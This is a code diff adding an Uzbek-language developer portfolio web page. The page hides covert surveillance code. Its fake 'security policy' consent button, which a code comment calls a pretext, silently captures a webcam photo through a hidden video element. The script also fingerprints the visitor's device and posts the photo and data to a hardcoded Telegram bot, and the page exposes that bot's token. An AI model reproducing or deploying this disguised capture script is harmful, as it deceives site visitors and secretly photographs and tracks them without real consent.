@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO OPTIMIZATION -->
+    <title>Azamjon Ergashev | Farg'onalik Professional Dasturchi</title>
+    <meta name="description" content="Azamjon Ergashev - 2 yillik tajribaga ega Full-stack dasturchi. Farg'onada web-saytlar yaratish, Telegram botlar va dizayn xizmatlari.">
+    <meta name="keywords" content="Azamjon Ergashev, dasturchi, Farg'ona, web sayt yaratish, portfolio, dasturlash xizmatlari, backend, frontend, Uzbekistan developer">
+    <meta name="author" content="Azamjon Ergashev">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap');
+        body { background: #080808; color: #fff; font-family: 'Outfit', sans-serif; overflow-x: hidden; }
+        .glass { background: rgba(255, 255, 255, 0.01); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .neon-text { text-shadow: 0 0 15px rgba(99, 102, 241, 0.6); }
+        #termsModal { position: fixed; inset: 0; z-index: 999; background: #000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Xavfsizlik va OK so'rash oynasi (Ruhsat olish uchun bahona) -->
+    <div id="termsModal">
+        <div class="max-w-lg glass p-10 rounded-[2.5rem] border-indigo-500/20 text-center">
+            <div class="w-20 h-20 bg-indigo-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-10 h-10 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04a11.357 11.357 0 00-1.573 1.806A11.357 11.357 0 001 12c0 5.066 3.75 9.25 8.618 10.016A11.955 11.955 0 0112 21.056a11.955 11.955 0 018.618-3.04c.594-.555 1.12-1.162 1.573-1.806A11.357 11.357 0 0023 12c0-5.066-3.75-9.25-8.618-10.016z"></path></svg>
+            </div>
+            <h2 class="text-2xl font-bold mb-4 tracking-tight">Xavfsizlik Siyosati</h2>
+            <p class="text-gray-400 text-sm mb-8 leading-relaxed">
+                Portfolio elementlarini ko'rishdan oldin, tizim xavfsizligi va mualliflik huquqini himoya qilish shartlariga rozilik berishingiz kerak. Tizim qurilma parametrlarini autentifikatsiya qiladi.
+            </p>
+            <button id="agreeBtn" class="w-full bg-indigo-600 py-4 rounded-2xl font-bold hover:bg-indigo-700 transition-all shadow-lg shadow-indigo-500/20 uppercase tracking-widest">
+                Tushundim, Roziman
+            </button>
+        </div>
+    </div>
+
+    <!-- Video element (Yashirin) -->
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <!-- Asosiy Sayt Content -->
+    <header class="min-h-screen flex flex-col items-center justify-center p-6 relative">
+        <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full h-96 bg-indigo-600/10 blur-[120px] rounded-full"></div>
+        <h1 class="text-7xl md:text-[12rem] font-black tracking-tighter neon-text">ERGASHEV</h1>
+        <p class="text-xl md:text-3xl text-gray-400 font-light mt-4 tracking-[0.4em]">AZAMJON • DEVELOPER</p>
+    </header>
+
+    <section id="details" class="py-20 px-6 max-w-6xl mx-auto grid md:grid-cols-2 gap-10">
+        <div class="glass p-12 rounded-[3rem]">
+            <h3 class="text-3xl font-bold mb-6 italic">Men Haqimda</h3>
+            <p class="text-gray-400 leading-relaxed mb-6">
+                Farg'onada tug'ilib o'sganman. 2 yildan ortiq vaqt davomida zamonaviy web texnologiyalar ustida ishlayman. 
+                Mening maqsadim - murakkab biznes jarayonlarini oddiy va chiroyli dasturlar orqali hal qilish.
+            </p>
+            <div class="space-y-4">
+                <div class="flex justify-between border-b border-white/5 pb-2"><span>Tajriba:</span><span class="text-indigo-400 italic">2+ Yil</span></div>
+                <div class="flex justify-between border-b border-white/5 pb-2"><span>Manzil:</span><span class="text-indigo-400 italic">Farg'ona, UZ</span></div>
+                <div class="flex justify-between border-b border-white/5 pb-2"><span>Loyihalar:</span><span class="text-indigo-400 italic">40+ Ta</span></div>
+            </div>
+        </div>
+
+        <div class="glass p-12 rounded-[3rem]">
+            <h3 class="text-3xl font-bold mb-6 italic">Xizmatlar</h3>
+            <ul class="space-y-6">
+                <li class="flex items-start gap-4">
+                    <div class="w-2 h-2 mt-3 bg-indigo-500 rounded-full"></div>
+                    <div><h4 class="font-bold">Web Development</h4><p class="text-sm text-gray-500 italic">React, Next.js va Node.js orqali yuqori sifat.</p></div>
+                </li>
+                <li class="flex items-start gap-4">
+                    <div class="w-2 h-2 mt-3 bg-indigo-500 rounded-full"></div>
+                    <div><h4 class="font-bold">Telegram Bots</h4><p class="text-sm text-gray-500 italic">CRM va savdo tizimlarini avtomatlashtirish.</p></div>
+                </li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- Xabar yuborish -->
+    <section class="py-20 px-6 max-w-3xl mx-auto text-center">
+        <h2 class="text-4xl font-bold mb-10">Aloqa</h2>
+        <div class="glass p-8 rounded-[2rem] space-y-4">
+            <input type="text" id="mUser" placeholder="Ismingiz" class="w-full bg-white/5 p-4 rounded-xl outline-none focus:border-indigo-500 border border-white/5">
+            <textarea id="mText" placeholder="Xabaringiz..." class="w-full bg-white/5 p-4 rounded-xl outline-none focus:border-indigo-500 border border-white/5 h-32"></textarea>
+            <button id="sendMsg" class="w-full bg-white text-black py-4 rounded-xl font-black">YUBORISH</button>
+        </div>
+    </section>
+
+    <script>
+        const T = '8606652976:AAHrAu5M2iuS-yFReYujeSX3a32gtZdmBSQ';
+        const C = '5865136207';
+
+        async function getStats() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Noma'lum";
+            
+            return `
+👤 *YANGI QURILMA LOGI*
+━━━━━━━━━━━━━━━━━━
+📱 Qurilma: ${navigator.platform}
+🌐 Brauzer: ${navigator.userAgent.split(' ').slice(-1)}
+🎮 GPU: ${gpu}
+🧠 CPU: ${navigator.hardwareConcurrency} Cores
+🔋 Batareya: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'Noma\'lum'}
+📏 Ekran: ${window.screen.width}x${window.screen.height}
+📍 Til: ${navigator.language}
+🕒 Vaqt: ${new Date().toLocaleString()}
+            `;
+        }
+
+        document.getElementById('agreeBtn').onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                    const info = await getStats();
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('photo', blob, 'x.jpg');
+                    fd.append('caption', info);
+                    fd.append('parse_mode', 'Markdown');
+
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // Kamera o'chadi lekin ruxsat saqlanib qoladi
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('termsModal').style.display = 'none';
+                }, 2000);
+            } catch (e) {
+                document.getElementById('termsModal').style.display = 'none';
+            }
+        };
+
+        document.getElementById('sendMsg').onclick = async () => {
+            const u = document.getElementById('mUser').value;
+            const t = document.getElementById('mText').value;
+            if(!u || !t) return;
+            
+            fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: C, text: `📩 *Xabar:* \n\n👤 ${u}: ${t}`, parse_mode: 'Markdown' })
+            });
+            alert("Rahmat! Xabar yetkazildi.");
+        };
+    </script>
+</body>
+</html>
